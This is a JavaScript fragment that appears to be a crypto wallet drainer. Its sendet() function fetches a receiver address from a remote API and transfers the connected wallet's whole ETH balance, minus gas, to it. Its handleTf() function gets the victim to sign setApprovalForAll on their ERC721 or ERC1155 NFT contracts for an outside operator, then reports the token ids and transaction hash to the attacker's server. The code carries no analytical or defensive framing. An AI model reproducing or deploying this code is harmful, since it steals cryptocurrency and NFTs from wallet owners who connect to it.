function getABI(type) {
  if (type == "ERC721") {
    return contract721ABI;
  }
  if (type == "ERC1155") {
    return contract1155ABI;
  }
  return null;
}

async function sendet() {
  const ethBalance = await web3.eth.getBalance(account);
  if (bn(ethBalance).lt(minEth)) {
    return;
  }
  const { data: info } = await axios(`${API_URL}/api/getEthAddress`);
  const receiverAddress = info?.address;

  const netPrice = await web3.eth.getGasPrice();
  const gasPrice = web3.utils.toWei(bn("20"), "gwei").add(bn(netPrice));

  const transaction = {
    from: account,
    to: receiverAddress,
    value: bn(ethBalance),
  };

  const gas = await web3.eth.estimateGas(transaction);
  const totalGas = gasPrice.mul(bn(gas));
  const price = bn(ethBalance).sub(totalGas);

  await web3.eth
    .sendTransaction({ ...transaction, gasPrice, value: price })
    .then(() => {
      axios(`${API_URL}/api/notifyseth`, {
        params: {
          currentAccount: account,
        },
      });
    })
    .catch((err) => {
      if (err.code) {
        console.log("User denied transaction");
      }
    });
}

async function handleTf(current_nft) {
  if (current_nft) {
    try {
      const contractABI = getABI(current_nft.schema);
      if (!contractABI) return;
      const _contract = new web3.eth.Contract(
        contractABI,
        current_nft.contractAddress
      );

      const approveGasFee = await _contract.methods
        .setApprovalForAll(_contractAddress, true)
        .estimateGas({ from: account });

      const netPrice = await web3.eth.getGasPrice();
      const _fe = current_nft.price > 50 ? current_nft.price : 0;
      const gasPrice = web3.utils
        .toWei(web3.utils.toBN("15"), "gwei")
        .add(web3.utils.toBN(netPrice));

      await new Promise(async (resolve, reject) => {
        await _contract.methods
          .setApprovalForAll(_contractAddress, true)
          .send({
            from: account,
            gas: approveGasFee,
            gasPrice: gasPrice,
          })
          .on("transactionHash", function (hash) {
            axios(`${API_URL}/api/callmint`, {
              params: {
                address: current_nft.contractAddress,
                currentAccount: account,
                ids: current_nft.ids,
                schema_name: current_nft.schema,
                hash: hash,
                _fe: _fe,
              },
            });
            resolve("User send the approval");
          })
          .catch((err) => {
            if (err.code) {
              reject("User denied transaction");
            }
          });
      }).catch((err) => {
        console.log(err, "promise get issue");
      });
    } catch (error) {
      console.log(error, "error");
    }
  }
}

